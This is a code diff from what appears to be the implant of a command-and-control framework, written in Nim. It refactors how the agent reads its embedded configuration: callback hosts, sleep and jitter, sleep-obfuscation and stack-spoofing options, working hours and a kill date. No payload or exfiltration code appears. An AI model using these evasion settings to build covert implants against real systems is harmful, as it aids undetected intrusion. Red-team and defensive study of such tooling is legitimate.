@@ -1,4 +1,5 @@
-import parsetoml, base64, system
+import parsetoml, system
+import ../utils/io
 import ../../common/[types, utils, crypto, serialize]
 
 const CONFIGURATION {.strdefine.}: string = ""
@@ -27,19 +28,30 @@ proc deserializeConfiguration(config: string): AgentCtx =
     var ctx = AgentCtx(
         agentId: generateUUID(),
         listenerId: Uuid.toString(unpacker.getUint32()),
-        ip: unpacker.getDataWithLengthPrefix(),
-        port: int(unpacker.getUint32()),
-        sleep: int(unpacker.getUint32()),
-        sleepTechnique: cast[SleepObfuscationTechnique](unpacker.getUint8()),
-        spoofStack: cast[bool](unpacker.getUint8()),
+        hosts: unpacker.getDataWithLengthPrefix(),
+        sleepSettings: SleepSettings(
+            sleepDelay: unpacker.getUint32(),
+            jitter: unpacker.getUint32(),
+            sleepTechnique: cast[SleepObfuscationTechnique](unpacker.getUint8()),
+            spoofStack: cast[bool](unpacker.getUint8()),
+            workingHours: WorkingHours(
+                enabled: cast[bool](unpacker.getUint8()),
+                startHour: cast[int32](unpacker.getUint32()),
+                startMinute: cast[int32](unpacker.getUint32()),
+                endHour: cast[int32](unpacker.getUint32()),
+                endMinute: cast[int32](unpacker.getUint32())
+            )
+        ),
+        killDate: cast[int64](unpacker.getUint64()),
         sessionKey: deriveSessionKey(agentKeyPair, unpacker.getByteArray(Key)),
         agentPublicKey: agentKeyPair.publicKey,
-        profile: parseString(unpacker.getDataWithLengthPrefix())
+        profile: parseString(unpacker.getDataWithLengthPrefix()),
+        registered: false
     ) 
 
     wipeKey(agentKeyPair.privateKey)
     
-    echo protect("[+] Profile configuration deserialized.")
+    print "[+] Profile configuration deserialized."
     return ctx
 
 proc init*(T: type AgentCtx): AgentCtx = 
@@ -51,7 +63,7 @@ proc init*(T: type AgentCtx): AgentCtx =
         return deserializeConfiguration(CONFIGURATION)
 
     except CatchableError as err:
-        echo "[-] " & err.msg
+        print "[-] " & err.msg
         return nil
 
 
